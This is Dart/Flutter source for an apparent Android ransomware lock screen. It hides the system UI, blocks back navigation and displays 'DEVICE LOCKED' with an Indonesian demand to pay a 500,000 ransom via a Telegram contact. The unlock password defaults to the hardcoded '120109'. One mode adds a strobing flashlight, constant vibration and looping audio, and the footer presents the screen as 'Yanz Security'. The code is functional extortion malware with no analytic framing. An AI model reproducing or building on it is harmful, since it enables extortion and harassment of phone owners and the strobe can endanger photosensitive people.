import 'dart:async';
import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:video_player/video_player.dart';
import 'package:just_audio/just_audio.dart';
import 'package:vibration/vibration.dart';
import 'package:torch_light/torch_light.dart';

class LockScreen extends StatefulWidget {
  final int mode;
  const LockScreen({super.key, required this.mode});
  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> {
  final _pw = TextEditingController();
  String _err = '';
  Map cfg = {};
  VideoPlayerController? _vid;
  final _player = AudioPlayer();
  Timer? _strobe, _vib;

  @override
  void initState() {
    super.initState();
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
    _load();
    if (widget.mode == 2) _initV2();
  }

  Future<void> _load() async {
    final p = await SharedPreferences.getInstance();
    setState(() => cfg = jsonDecode(p.getString('cfg') ?? '{}'));
  }

  Future<void> _initV2() async {
    try {
      _vid = VideoPlayerController.asset('assets/video.mp4');
      await _vid!.initialize();
      _vid!.setLooping(true);
      _vid!.setVolume(0);
      _vid!.play();
      await _player.setAsset('assets/music.mp3');
      _player.setLoopMode(LoopMode.one);
      _player.play();
      _strobe = Timer.periodic(const Duration(milliseconds: 400), (_) async {
        try {
          if (await TorchLight.isTorchAvailable()) {
            await TorchLight.enableTorch();
            await Future.delayed(const Duration(milliseconds: 200));
            await TorchLight.disableTorch();
          }
        } catch (_) {}
      });
      _vib = Timer.periodic(const Duration(seconds: 1), (_) { Vibration.vibrate(duration: 500); });
    } catch (_) {}
    setState(() {});
  }

  Future<void> _check() async {
    final expected = widget.mode == 2 ? (cfg['lock_v2_pw'] ?? '120109') : (cfg['lock_v1_pw'] ?? '120109');
    if (_pw.text == expected) {
      final p = await SharedPreferences.getInstance();
      await p.setBool('lock_v1', false); await p.setBool('lock_v2', false);
      _strobe?.cancel(); _vib?.cancel(); await _player.stop();
      try { await TorchLight.disableTorch(); } catch (_) {}
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
      if (mounted) Navigator.of(context).pop();
    } else {
      setState(() => _err = 'PASSWORD SALAH');
      Vibration.vibrate(duration: 800);
    }
  }

  @override
  void dispose() {
    _strobe?.cancel(); _vib?.cancel(); _vid?.dispose(); _player.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final msg = (cfg['lock_v1_msg'] ?? 'Bayar tebusan 500.000 untuk membuka HP ini.\nHubungi Telegram @yanzstoru').toString();

    return PopScope(
      canPop: false,
      child: Scaffold(
        body: Stack(fit: StackFit.expand, children: [
          if (widget.mode == 2 && _vid != null && _vid!.value.isInitialized)
            FittedBox(fit: BoxFit.cover, child: SizedBox(width: _vid!.value.size.width, height: _vid!.value.size.height, child: VideoPlayer(_vid!)))
          else
            Image.asset('assets/bg.png', fit: BoxFit.cover),

          BackdropFilter(filter: ImageFilter.blur(sigmaX: 6, sigmaY: 6), child: Container(color: Colors.black.withOpacity(0.75))),

          SafeArea(child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(children: [
              const SizedBox(height: 20),
              Image.asset('assets/logo.png', width: 110, height: 110),
              const SizedBox(height: 30),
              Text('DEVICE LOCKED', style: TextStyle(fontSize: 30, letterSpacing: 8, fontWeight: FontWeight.bold, color: Colors.red.shade400, shadows: [const Shadow(color: Colors.red, blurRadius: 20)])),
              const SizedBox(height: 20),
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(color: Colors.black.withOpacity(0.6), borderRadius: BorderRadius.circular(14), border: Border.all(color: Colors.red.withOpacity(0.4))),
                child: Text(msg, textAlign: TextAlign.center, style: const TextStyle(fontSize: 15, height: 1.6, color: Colors.white)),
              ),
              const Spacer(),
              TextField(
                controller: _pw, obscureText: true, keyboardType: TextInputType.number, textAlign: TextAlign.center,
                style: const TextStyle(color: Colors.white, fontSize: 22, letterSpacing: 8),
                decoration: InputDecoration(
                  hintText: '• • • • • •', hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), letterSpacing: 8),
                  filled: true, fillColor: Colors.black.withOpacity(0.6),
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.red)),
                ),
              ),
              if (_err.isNotEmpty) Padding(padding: const EdgeInsets.only(top: 10), child: Text(_err, style: const TextStyle(color: Colors.red, fontSize: 12, letterSpacing: 3))),
              const SizedBox(height: 20),
              SizedBox(width: double.infinity, height: 56,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.red.shade800, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))),
                  onPressed: _check,
                  child: const Text('UNLOCK', style: TextStyle(fontSize: 15, letterSpacing: 4, fontWeight: FontWeight.bold)),
                )),
              const SizedBox(height: 14),
              Text('Yanz Security • Device Protected', style: TextStyle(fontSize: 10, color: Colors.white.withOpacity(0.3), letterSpacing: 3)),
              const SizedBox(height: 20),
            ]),
          )),
        ]),
      ),
    );
  }
}